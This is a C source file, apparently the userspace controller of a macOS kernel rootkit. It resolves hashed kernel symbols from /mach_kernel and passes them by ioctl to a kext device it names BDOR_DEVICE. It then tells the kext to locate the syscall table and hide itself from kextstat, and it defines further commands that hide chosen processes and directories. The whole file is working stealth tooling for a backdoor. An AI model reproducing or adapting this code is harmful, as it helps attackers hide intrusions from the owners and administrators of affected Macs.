#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/sysctl.h>

#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>

#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include <mach-o/nlist.h>

#define SWAP_LONG(a) ( ((a) << 24) | \
                       (((a) << 8) & 0x00ff0000) | \
                       (((a) >> 8) & 0x0000ff00) | \
                       ((a) >> 24) )

#define BDOR_DEVICE       "/dev/pfCPU"
#define MCHOOK_MAGIC      31338
#define MAX_USER          20
#define MAX_USER_LENGTH   20
#define DLENGTH           30

// Used for the uspace<->kspace initialization
#define MCHOOK_INIT         _IOW(MCHOOK_MAGIC, 8978726, char [MAX_USER_LENGTH])
// Show kext from kextstat -- DEBUG
#define MCHOOK_SHOWK        _IO( MCHOOK_MAGIC, 8349871)
// Hide kext from kextstat
#define MCHOOK_HIDEK        _IO( MCHOOK_MAGIC, 4975738)
// Hide given pid
#define MCHOOK_HIDEP        _IOW(MCHOOK_MAGIC, 9400284, char [MAX_USER_LENGTH])
// Hide given dir/file name
#define MCHOOK_HIDED        _IOW(MCHOOK_MAGIC, 1998274, char [MAX_DIR_LENGTH])
// Show Process -- DEBUG
#define MCHOOK_SHOWP        _IO( MCHOOK_MAGIC, 6839840)
// Unregister userspace component
#define MCHOOK_UNREGISTER   _IOW(MCHOOK_MAGIC, 5739299, char [MAX_USER_LENGTH])
// Returns the number of active backdoors
#define MCHOOK_GET_ACTIVES  _IOR(MCHOOK_MAGIC, 7489827, int)
// Pass symbols resolved from uspace to kspace (not exported symbol snow)
#define MCHOOK_SOLVE_SYM_32 _IOW(MCHOOK_MAGIC, 6483647, struct symbol_32)
#ifdef __LP64__
#define MCHOOK_SOLVE_SYM_64 _IOW(MCHOOK_MAGIC, 6483648, struct symbol_64)
#endif
// Tell the kext to find sysent
#define MCHOOK_FIND_SYS     _IOW(MCHOOK_MAGIC, 4548874, struct os_version)

typedef struct symbol_32 {
  uint32_t hash;
  uint32_t address;
} symbol32_t;

#ifdef __LP64__
typedef struct symbol_64 {
  uint64_t hash;
  uint64_t address;
} symbol64_t;
#endif

typedef struct os_version {
  uint32_t major;
  uint32_t minor;
  uint32_t bugfix;
} os_version_t;


static unsigned int
sdbm (unsigned char *str)
{
  unsigned int hash = 0;
  int c;

  while ((c = *str++))
    hash = c + (hash << 6) + (hash << 16) - hash;

  return hash;
}

#ifdef __LP64__
uint64_t
findSymbolInFatBinary64(void *imageBase, unsigned int symbolHash)
{
#ifdef DEBUG
  infoLog(@"[ii] findSymbolInFatBinary64\n");
#endif
  
  if (imageBase == NULL)
    {
    return -1;
    }
  
  struct mach_header_64 *mh_header        = NULL;
  struct load_command *l_command          = NULL; 
  struct nlist_64 *sym_nlist              = NULL; 
  struct symtab_command *sym_command      = NULL;
  struct segment_command_64 *seg_command  = NULL;
  struct fat_header *f_header             = NULL;
  struct fat_arch *f_arch                 = NULL;
  
  char *symbolName = NULL;
  
  int offset, symbolOffset, stringOffset, x86Offset, i, found, nfat;
  
  unsigned int linkeditHash = 0xf51f49c4; // "__LINKEDIT" sdbm hashed
  unsigned int hash;
  
  offset = found = 0;
  f_header = (struct fat_header *)imageBase;
  
  offset += sizeof (struct fat_header);
  nfat = SWAP_LONG (f_header->nfat_arch);
  
#ifdef DEBUG
  infoLog(@"[ii] magic: %x\n", f_header->magic);
  infoLog(@"[ii] nfat arch: %d\n", nfat);
#endif
  
  for (i = 0; i < nfat; i++)
    {
    f_arch = imageBase + offset;
    int cpuType = SWAP_LONG(f_arch->cputype);
    
    if (cpuType == CPU_TYPE_X86_64)
      break;
    
    offset += sizeof (struct fat_arch);
    }	
  
  if (f_arch == NULL)
    return -1;
  
  x86Offset = SWAP_LONG (f_arch->offset);
#ifdef DEBUG
  printf ("[ii] x86_64 offset: %x\n", x86Offset);
#endif
  
  offset = x86Offset;
  mh_header = (struct mach_header_64 *)(imageBase + offset); 
  offset += sizeof (struct mach_header_64);
  
#ifdef DEBUG
  infoLog(@"imageBase in findSymbolFat: %p\n", mh_header);
#endif
  
#ifdef DEBUG
  infoLog(@"[ii] ncmdsFat: %d\n", mh_header->ncmds);
#endif
  
  for (i = 0; i < mh_header->ncmds; i++)
    {
    l_command = imageBase + offset; 
    
#ifdef DEBUG
    infoLog(@"[ii] cmdFat: %d\n", l_command->cmd);
#endif
    
    if (l_command->cmd == LC_SEGMENT)
      {
      if (found)
        {
        offset += l_command->cmdsize;
        continue;
        }
      
      seg_command = imageBase + offset;
      
#ifdef DEBUG
      infoLog(@"[ii] segNameFat: %s\n", seg_command->segname);
#endif
      
      if (sdbm ((unsigned char *)seg_command->segname) == linkeditHash)
        found = 1;
      }
    else if (l_command->cmd == LC_SYMTAB)
      {
      sym_command = imageBase + offset; 
      
      if (found)
        break;
      }
    
    offset += l_command->cmdsize;
    }
  
  if (sym_command != NULL)
    {
    symbolOffset = x86Offset + sym_command->symoff;
    stringOffset = x86Offset + sym_command->stroff;
    }
  else
    {
    return -1;
    }
  
#ifdef DEBUG
  infoLog(@"[ii] offsetFat: %x\n", offset);
  infoLog(@"[ii] stringOffsetFat: %x\n", stringOffset);
  infoLog(@"[ii] nSymsFat: %d\n", sym_command->nsyms);
#endif
  
  for (i = 0; i < sym_command->nsyms; i++)
    {
    sym_nlist = (struct nlist_64 *)(imageBase + symbolOffset);
    symbolOffset += sizeof (struct nlist_64);
    
    if (sym_nlist->n_un.n_strx == 0x0)
      {
      continue;
      }
    
    symbolName  = (char *)(imageBase + sym_nlist->n_un.n_strx + stringOffset);
    hash = sdbm ((unsigned char *)symbolName);
    
#ifdef DEBUG_VERBOSE
    printf ("[ii] SYMBOLFat: %s\n", symbolName);
#endif
    if (hash == symbolHash)
      {
#ifdef DEBUG
      printf ("[ii] Symbol Found\n");
      printf ("[ii] SYMBOLFat: %s\n", symbolName);
      printf ("[ii] addressFat: %llx\n", sym_nlist->n_value);
#endif
      
      return sym_nlist->n_value;
      }
    }
  
  return -1;
}
#endif 

unsigned int
findSymbolInFatBinary (void *imageBase, unsigned int symbolHash)
{
#ifdef DEBUG
  printf("[ii] findSymbolInFatBinary!\n");
#endif

  if (imageBase == 0x0)
    {
      return -1;
    }

  struct mach_header *mh_header       = NULL;
  struct load_command *l_command      = NULL; 
  struct nlist *sym_nlist             = NULL; 
  struct symtab_command *sym_command  = NULL;
  struct segment_command *seg_command = NULL;
  struct fat_header *f_header         = NULL;
  struct fat_arch *f_arch             = NULL;

  char *symbolName = NULL;

  int offset, symbolOffset, stringOffset, x86Offset, i, found, nfat;

  unsigned int linkeditHash = 0xf51f49c4; // "__LINKEDIT" sdbm hashed
  unsigned int hash;

  offset = found = 0;
  f_header = (struct fat_header *)imageBase;

  offset += sizeof (struct fat_header);
  nfat = SWAP_LONG (f_header->nfat_arch);

#ifdef DEBUG
  printf("[ii] magic: %x\n", f_header->magic);
  printf("[ii] nFatArch: %d\n", nfat);
#endif

  //return -1;

  for (i = 0; i < nfat; i++)
    {
      f_arch = imageBase + offset;
      int cpuType = SWAP_LONG (f_arch->cputype);

      if (cpuType == 0x7)
        break;

      offset += sizeof (struct fat_arch);
    }	

  x86Offset = SWAP_LONG (f_arch->offset);
#ifdef DEBUG
  printf ("[ii] x86 offset: %x\n", x86Offset);
#endif

  offset = x86Offset;
  mh_header = (struct mach_header *)(imageBase + offset); 
  offset += sizeof (struct mach_header);

#ifdef DEBUG
  printf("imageBase in findSymbolFat: %x\n", mh_header);
#endif

#ifdef DEBUG
  printf("[ii] ncmdsFat: %d\n", mh_header->ncmds);
#endif

  for (i = 0; i < mh_header->ncmds; i++)
    {
      l_command = imageBase + offset; 

#ifdef DEBUG
      printf("[ii] cmdFat: %d\n", l_command->cmd);
#endif

      if (l_command->cmd == LC_SEGMENT)
        {
          if (found)
            {
              offset += l_command->cmdsize;
              continue;
            }

          seg_command = imageBase + offset;

#ifdef DEBUG
          printf("[ii] segNameFat: %s\n", seg_command->segname);
#endif

          if (sdbm ((unsigned char *)seg_command->segname) == linkeditHash)
            found = 1;
        }
      else if (l_command->cmd == LC_SYMTAB)
        {
          sym_command = imageBase + offset; 

          if (found)
            break;
        }

      offset += l_command->cmdsize;
    }

  symbolOffset = x86Offset + sym_command->symoff;
  stringOffset = x86Offset + sym_command->stroff;

#ifdef DEBUG
  printf("[ii] offsetFat: %x\n", offset);
  printf("[ii] stringOffsetFat: %x\n", stringOffset);
  printf("[ii] nSymsFat: %d\n", sym_command->nsyms);
#endif

  for (i = 0; i < sym_command->nsyms; i++)
    {
      sym_nlist = (struct nlist *)(imageBase + symbolOffset);
      symbolOffset += sizeof (struct nlist);

      if (sym_nlist->n_un.n_strx == 0x0)
        {
          continue;
        }

      symbolName  = (char *)(imageBase + sym_nlist->n_un.n_strx + stringOffset);
      hash = sdbm ((unsigned char *)symbolName);

#ifdef DEBUG_VERBOSE
      printf ("[ii] SYMBOLFat: %s\n", symbolName);
#endif
      if (hash == symbolHash)
        {
#ifdef DEBUG
          printf ("[ii] Symbol Found\n");
          printf ("[ii] SYMBOLFat: %s\n", symbolName);
          printf ("[ii] addressFat: %x\n", sym_nlist->n_value);
#endif
          return sym_nlist->n_value;
        }
    }

  return -1;
}

#ifdef __LP64__

int main()
{
  int kernFD = 0;
  void *imageBase = NULL;
  char filename[] = "/mach_kernel";
  struct stat sb;
  int filesize = 0;
  symbol64_t sym;

  int kext_fd = 0, ret = 0;
  int i = 0;
  const char username[] = "userleo2";

  unsigned int kmod_hash                = 0xdd2c36d6; // _kmod
  unsigned int nsysent_hash             = 0xb366074d; // _nsysent
  unsigned int tasks_hash               = 0xdbb44cef; // _tasks
  unsigned int allproc_hash             = 0x3fd3c678; // _allproc
  unsigned int tasks_count_hash         = 0xa3f77e7f; // _tasks_count
  unsigned int nprocs_hash              = 0xa77ea22e; // _nprocs
  unsigned int tasks_threads_lock_hash  = 0xd94f2751; // _tasks_threads_locks
  unsigned int proc_lock_hash           = 0x44c085d5; // _proc_lock
  unsigned int proc_unlock_hash         = 0xf46ca50e; // _proc_unlock
  unsigned int proc_list_lock_hash      = 0x9129f0e2; // _proc_list_lock
  unsigned int proc_list_unlock_hash    = 0x5337599b; // _proc_list_unlock
  unsigned int kext_lookup_with_tag_hash = 0xcf7000a8; // __ZN6OSKext21lookupKextWithLoadTagEj
  unsigned int io_recursive_lock_hash   = 0x1f7127e3; // _IORecursiveLockLock

  printf("I'm x64\n");

  kernFD = open(filename, O_RDONLY);
  if ( stat(filename, &sb) == -1 )
    printf("err 1\n");

  filesize = sb.st_size;
  printf("filesize: %d\n", filesize);

  if ((imageBase = mmap (0, filesize, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE, kernFD, 0)) == (caddr_t)-1)
    printf("err 2\n");

  printf("file mapped @ 0x%lx\n", (unsigned long)imageBase);

  printf("[-] Opening /dev entry\n");
  kext_fd = open(BDOR_DEVICE, O_RDWR);

  // Initializing
  printf("[-] Initializing uspace<->kspace\n");
  ret = ioctl(kext_fd, MCHOOK_INIT, username);

  uint64_t antani = 0;
  antani = findSymbolInFatBinary64(imageBase, kmod_hash);
  printf("kmod @ 0x%lx\n", antani);
  sym.hash = kmod_hash;
  sym.address = antani;

  // Sending Symbols
  printf("[-] Sending symbols\n");
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_64, &sym);

  antani = findSymbolInFatBinary64(imageBase, nsysent_hash);
  sym.hash   = nsysent_hash;
  sym.address = antani;
  printf("nsysent.hash = %lx, nsysent.hash: %lx\n", sym.hash, sym.address);
  // Sending Symbols
  printf("[-] Sending symbols\n");
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_64, &sym);

  antani = findSymbolInFatBinary64(imageBase, tasks_hash);
  printf("tasks @ 0x%lx\n", antani);
  sym.hash   = tasks_hash;
  sym.address = antani;
  
  // Sending Symbols
  printf("[-] Sending symbols\n");
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_64, &sym);

  antani = findSymbolInFatBinary64(imageBase, allproc_hash);
  printf("allproc @ 0x%lx\n", antani);
  sym.hash   = allproc_hash;
  sym.address = antani;

  // Sending Symbols
  printf("[-] Sending symbols\n");
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_64, &sym);

  antani = findSymbolInFatBinary64(imageBase, tasks_count_hash);
  sym.hash   = tasks_count_hash;
  sym.address = antani;
  // Sending Symbols
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_64, &sym);

  antani = findSymbolInFatBinary64(imageBase, nprocs_hash);
  sym.hash   = nprocs_hash;
  sym.address = antani;
  // Sending Symbols
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_64, &sym);

  antani = findSymbolInFatBinary64(imageBase, tasks_threads_lock_hash);
  sym.hash   = tasks_threads_lock_hash;
  sym.address = antani;
  // Sending Symbols
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_64, &sym);

  antani = findSymbolInFatBinary64(imageBase, proc_lock_hash);
  sym.hash   = proc_lock_hash;
  sym.address = antani;
  // Sending Symbols
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_64, &sym);

  antani = findSymbolInFatBinary64(imageBase, proc_unlock_hash);
  sym.hash   = proc_unlock_hash;
  sym.address = antani;
  // Sending Symbols:1
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_64, &sym);

  antani = findSymbolInFatBinary64(imageBase, proc_list_lock_hash);
  sym.hash   = proc_list_lock_hash;
  sym.address = antani;
  // Sending Symbols
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_64, &sym);

  antani = findSymbolInFatBinary64(imageBase, proc_list_unlock_hash);
  sym.hash   = proc_list_unlock_hash;
  sym.address = antani;
  // Sending Symbols
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_64, &sym);

  antani = findSymbolInFatBinary64(imageBase, kext_lookup_with_tag_hash);
  sym.hash  = kext_lookup_with_tag_hash;
  sym.address = antani;
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_64, &sym);
  printf("kext_lookup_with_tag: %lx\n", antani);
  
  antani = findSymbolInFatBinary64(imageBase, io_recursive_lock_hash);
  sym.hash  = io_recursive_lock_hash;
  sym.address = antani;
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_64, &sym);
  printf("io_recursive_lock: %lx\n", antani);



  munmap(imageBase, filesize);
  close(kernFD);

  os_version_t os_ver;
  os_ver.major  = 10;
  os_ver.minor  = 7;
  os_ver.bugfix = 3;

  // Telling kext to find sysent based on OS version
  printf("[-] Telling KEXT to find sysent\n");
  ret = ioctl(kext_fd, MCHOOK_FIND_SYS, &os_ver);

  // Hide KEXT
  printf("[-] Hiding KEXT\n");
  ret = ioctl(kext_fd, MCHOOK_HIDEK);
  

  // Hiding a simple Directory
  // printf("[-] Hiding Tests dir\n");
  // ret = ioctl(kext_fd, MCHOOK_HIDED, "Tests");

  // Hide Process
  // printf("[-] Hiding process\n");
  // ret = ioctl(kext_fd, MCHOOK_HIDEP, username);
  
  // Unregister Process
  printf("[-] Unregistering uspace component from kspace\n");
  ret = ioctl(kext_fd, MCHOOK_UNREGISTER, username);

  return 0;
}
#else

int main()
{
  int kernFD = 0;
  void *imageBase = NULL;
  char filename[] = "/mach_kernel";
  struct stat sb;
  int filesize = 0;
  symbol32_t sym;
  
  int kext_fd = 0, ret = 0;
  int i = 0;
  const char username[] = "userleo2";
  
  unsigned int kmod_hash                = 0xdd2c36d6; // _kmod
  unsigned int nsysent_hash             = 0xb366074d; // _nsysent
  unsigned int tasks_hash               = 0xdbb44cef; // _tasks
  unsigned int allproc_hash             = 0x3fd3c678; // _allproc
  unsigned int tasks_count_hash         = 0xa3f77e7f; // _tasks_count
  unsigned int nprocs_hash              = 0xa77ea22e; // _nprocs
  unsigned int tasks_threads_lock_hash  = 0xd94f2751; // _tasks_threads_locks
  unsigned int proc_lock_hash           = 0x44c085d5; // _proc_lock
  unsigned int proc_unlock_hash         = 0xf46ca50e; // _proc_unlock
  unsigned int proc_list_lock_hash      = 0x9129f0e2; // _proc_list_lock
  unsigned int proc_list_unlock_hash    = 0x5337599b; // _proc_list_unlock
  unsigned int kext_lookup_with_tag_hash = 0xcf7000a8; // __ZN6OSKext21lookupKextWithLoadTagEj
  unsigned int io_recursive_lock_hash   = 0x1f7127e3; // _IORecursiveLockLock
  
  
  kernFD = open(filename, O_RDONLY);
  if ( stat(filename, &sb) == -1 )
    printf("err 1\n");
  
  filesize = sb.st_size;
  printf("filesize: %d\n", filesize);
  
  if ((imageBase = mmap (0, filesize, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE, kernFD, 0)) == (caddr_t)-1)
    printf("err 2\n");
  
  printf("file mapped @ 0x%lx\n", (unsigned long)imageBase);
  
  printf("[-] Opening /dev entry\n");
  kext_fd = open(BDOR_DEVICE, O_RDWR);
  
  // Initializing
  printf("[-] Initializing uspace<->kspace\n");
  ret = ioctl(kext_fd, MCHOOK_INIT, username);
  
  unsigned int antani = 0;
  antani = findSymbolInFatBinary(imageBase, kmod_hash);
  printf("kmod @ 0x%0x\n", antani);
  sym.hash = kmod_hash;
  sym.address = antani;
  
  // Sending Symbols
  printf("[-] Sending symbols\n");
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_32, &sym);
  
  antani = findSymbolInFatBinary(imageBase, nsysent_hash);
  printf("nsysent @ 0x%0x\n", antani);
  sym.hash   = nsysent_hash;
  sym.address = antani;
  int *nsysent = NULL;
  nsysent = &antani;
  printf("nsysent = %d\n", *nsysent);
  
  // Sending Symbols
  printf("[-] Sending symbols\n");
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_32, &sym);
  
  antani = findSymbolInFatBinary(imageBase, tasks_hash);
  printf("tasks @ 0x%0x\n", antani);
  sym.hash   = tasks_hash;
  sym.address = antani;
  
  // Sending Symbols
  printf("[-] Sending symbols\n");
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_32, &sym);
  
  antani = findSymbolInFatBinary(imageBase, allproc_hash);
  printf("allproc @ 0x%0x\n", antani);
  sym.hash   = allproc_hash;
  sym.address = antani;
  
  // Sending Symbols
  printf("[-] Sending symbols\n");
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_32, &sym);
  
  antani = findSymbolInFatBinary(imageBase, tasks_count_hash);
  sym.hash   = tasks_count_hash;
  sym.address = antani;
  // Sending Symbols
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_32, &sym);
  
  antani = findSymbolInFatBinary(imageBase, nprocs_hash);
  sym.hash   = nprocs_hash;
  sym.address = antani;
  // Sending Symbols
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_32, &sym);
  
  antani = findSymbolInFatBinary(imageBase, tasks_threads_lock_hash);
  sym.hash   = tasks_threads_lock_hash;
  sym.address = antani;
  // Sending Symbols
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_32, &sym);
  
  antani = findSymbolInFatBinary(imageBase, proc_lock_hash);
  sym.hash   = proc_lock_hash;
  sym.address = antani;
  // Sending Symbols
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_32, &sym);
  
  antani = findSymbolInFatBinary(imageBase, proc_unlock_hash);
  sym.hash   = proc_unlock_hash;
  sym.address = antani;
  // Sending Symbols:1
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_32, &sym);
  
  antani = findSymbolInFatBinary(imageBase, proc_list_lock_hash);
  sym.hash   = proc_list_lock_hash;
  sym.address = antani;
  // Sending Symbols
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_32, &sym);
  
  antani = findSymbolInFatBinary(imageBase, proc_list_unlock_hash);
  sym.hash   = proc_list_unlock_hash;
  sym.address = antani;
  // Sending Symbols
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_32, &sym);

  antani = findSymbolInFatBinary(imageBase, kext_lookup_with_tag_hash);
  sym.hash  = kext_lookup_with_tag_hash;
  sym.address = antani;
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_32, &sym);
  printf("kext_lookup_with_tag: %08x\n", antani);
  
  antani = findSymbolInFatBinary(imageBase, io_recursive_lock_hash);
  sym.hash  = io_recursive_lock_hash;
  sym.address = antani;
  ret = ioctl(kext_fd, MCHOOK_SOLVE_SYM_32, &sym);
  printf("io_recursive_lock: %08x\n", antani);
  
  munmap(imageBase, filesize);
  close(kernFD);
  
  return 0;
  os_version_t os_ver;
  os_ver.major  = 10;
  os_ver.minor  = 7;
  os_ver.bugfix = 3;
  
  // Telling kext to find sysent based on OS version
  printf("[-] Telling KEXT to find sysent\n");
  ret = ioctl(kext_fd, MCHOOK_FIND_SYS, &os_ver);
  
  printf("[-] Sleeping ...\n");
  //  sleep(5);
  
  /*
   
   // Hiding a simple Directory
   printf("[-] Hiding Tests dir\n");
   ret = ioctl(kext_fd, MCHOOK_HIDED, "Tests");
   
   // Hide Process
   printf("[-] Hiding process\n");
   ret = ioctl(kext_fd, MCHOOK_HIDEP, username);
   
   printf("[-] Sleeping ...\n");
   sleep(5);
   */
  
  // Hide KEXT
  printf("[-] Hiding KEXT\n");
  ret = ioctl(kext_fd, MCHOOK_HIDEK);
  //  sleep(5);
  
  // Unregister Process
  printf("[-] Unregistering uspace component from kspace\n");
  ret = ioctl(kext_fd, MCHOOK_UNREGISTER, username);
  
  printf("[-] Sleeping ...\n");
  //  sleep(5);
  
  return 0;
}
#endif
